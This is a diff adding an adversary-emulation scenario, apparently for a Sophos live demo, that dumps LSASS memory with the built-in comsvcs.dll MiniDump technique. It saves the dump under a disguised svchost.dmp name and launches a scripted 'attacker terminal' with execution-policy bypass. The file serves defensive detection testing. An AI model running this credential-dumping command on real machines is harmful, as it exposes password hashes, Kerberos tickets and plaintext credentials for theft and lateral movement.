@@ -1,0 +1,78 @@
+---
+- id: scn028-a2-lsass-dump
+  name: "SCN-028 | Phase 2: Credential Theft via LSASS Dump (Visible Terminal)"
+  description: |
+    Opens a visible attacker terminal, then dumps LSASS memory using the built-in
+    comsvcs.dll MiniDump — a living-off-the-land technique requiring no external tools.
+    On the unmanaged VM the dump succeeds and a credential_dump.txt artifact appears on
+    the Desktop. On the Sophos-protected VM, Intercept X blocks the LSASS memory access
+    and fires a critical T1003.001 alert — the key Sophos detection moment on stage.
+    Maps to T1003.001 (OS Credential Dumping: LSASS Memory).
+  tactic: credential-access
+  technique:
+    attack_id: T1003.001
+    name: "OS Credential Dumping: LSASS Memory"
+  platforms:
+    windows:
+      psh:
+        command: |
+          $lsassPid = (Get-Process lsass -ErrorAction SilentlyContinue).Id
+          $dumpPath = "C:\Windows\Temp\svchost.dmp"
+          $desktop  = [Environment]::GetFolderPath('Desktop')
+
+          # Build and launch visible attacker terminal FIRST so audience sees it
+          $sp = "$env:TEMP\sd_phase2.ps1"
+          '' | Out-File $sp -Encoding UTF8
+          Add-Content $sp 'try { $host.UI.RawUI.BackgroundColor = "Black"; $host.UI.RawUI.ForegroundColor = "White"; Clear-Host } catch {}'
+          Add-Content $sp 'Write-Host ""'
+          Add-Content $sp 'Write-Host "  SOPHOS // STAGE DIVE  -  LIVE ATTACK CHAIN" -ForegroundColor DarkRed'
+          Add-Content $sp 'Write-Host "  ─────────────────────────────────────────────" -ForegroundColor DarkGray'
+          Add-Content $sp 'Write-Host ""'
+          Add-Content $sp 'Write-Host "  PHASE 2 — CREDENTIAL THEFT" -ForegroundColor Yellow'
+          Add-Content $sp 'Write-Host "  T1003.001  |  OS Credential Dumping: LSASS Memory" -ForegroundColor DarkGray'
+          Add-Content $sp 'Write-Host ""'
+          Add-Content $sp '  $pid = (Get-Process lsass -ErrorAction SilentlyContinue).Id'
+          Add-Content $sp '  Write-Host "  [*] Target process  : lsass.exe (PID: $pid)" -ForegroundColor White'
+          Add-Content $sp '  Write-Host "  [*] Technique       : comsvcs.dll MiniDump (LOLBin)" -ForegroundColor White'
+          Add-Content $sp '  Write-Host "  [*] No external tools required — uses built-in Windows DLL" -ForegroundColor White'
+          Add-Content $sp 'Write-Host ""'
+          Add-Content $sp 'Write-Host "  [*] Invoking rundll32 comsvcs.dll MiniDump on lsass.exe..." -ForegroundColor Cyan'
+          Add-Content $sp 'Start-Sleep -Seconds 3'
+          Add-Content $sp '  $dumpPath = "C:\Windows\Temp\svchost.dmp"'
+          Add-Content $sp '  if (Test-Path $dumpPath) {'
+          Add-Content $sp '    $sz = [math]::Round((Get-Item $dumpPath).Length / 1MB, 1)'
+          Add-Content $sp '    Write-Host ""'
+          Add-Content $sp '    Write-Host "  [+] LSASS dump successful: $dumpPath ($sz MB)" -ForegroundColor Green'
+          Add-Content $sp '    Write-Host "  [+] Contains: NTLM hashes, Kerberos tickets, plaintext passwords" -ForegroundColor Green'
+          Add-Content $sp '    Write-Host "  [+] Attacker can now move laterally to any system on the network" -ForegroundColor Green'
+          Add-Content $sp '  } else {'
+          Add-Content $sp '    Write-Host ""'
+          Add-Content $sp '    Write-Host "  [!] LSASS dump BLOCKED by endpoint protection" -ForegroundColor Red'
+          Add-Content $sp '    Write-Host "  [!] Sophos Intercept X prevented credential theft" -ForegroundColor Red'
+          Add-Content $sp '  }'
+          Add-Content $sp 'Write-Host ""'
+
+          Start-Process powershell -ArgumentList '-NoProfile','-NoExit','-ExecutionPolicy','Bypass','-File',$sp -WindowStyle Normal
+          Start-Sleep -Seconds 2
+
+          # Run the actual LSASS dump
+          if ($lsassPid) {
+            rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsassPid $dumpPath full
+            Start-Sleep -Seconds 4
+          }
+
+          if (Test-Path $dumpPath) {
+            $sz = [math]::Round((Get-Item $dumpPath).Length / 1MB, 1)
+            # Drop visible artifact on Desktop
+            "CREDENTIAL DUMP SUCCESSFUL`nSource: lsass.exe (PID $lsassPid)`nSize:   ${sz} MB`nPath:   $dumpPath`nContains: NTLM hashes, Kerberos tickets, cached credentials`n`n[SOPHOS DEMO — no actual credentials were extracted]" |
+              Out-File "$desktop\credential_dump_complete.txt" -Encoding UTF8
+            Write-Output "[+] LSASS dump: $dumpPath ($sz MB)"
+            Write-Output "[+] Artifact: Desktop\credential_dump_complete.txt"
+          } else {
+            Write-Output "[!] LSASS dump blocked — Sophos Intercept X prevented credential theft (expected on protected VM)"
+          }
+        cleanup: |
+          Remove-Item "C:\Windows\Temp\svchost.dmp" -Force -ErrorAction SilentlyContinue
+          Remove-Item "$([Environment]::GetFolderPath('Desktop'))\credential_dump_complete.txt" -Force -ErrorAction SilentlyContinue
+          Remove-Item "$env:TEMP\sd_phase2.ps1" -Force -ErrorAction SilentlyContinue
+          Write-Output "Cleanup complete"
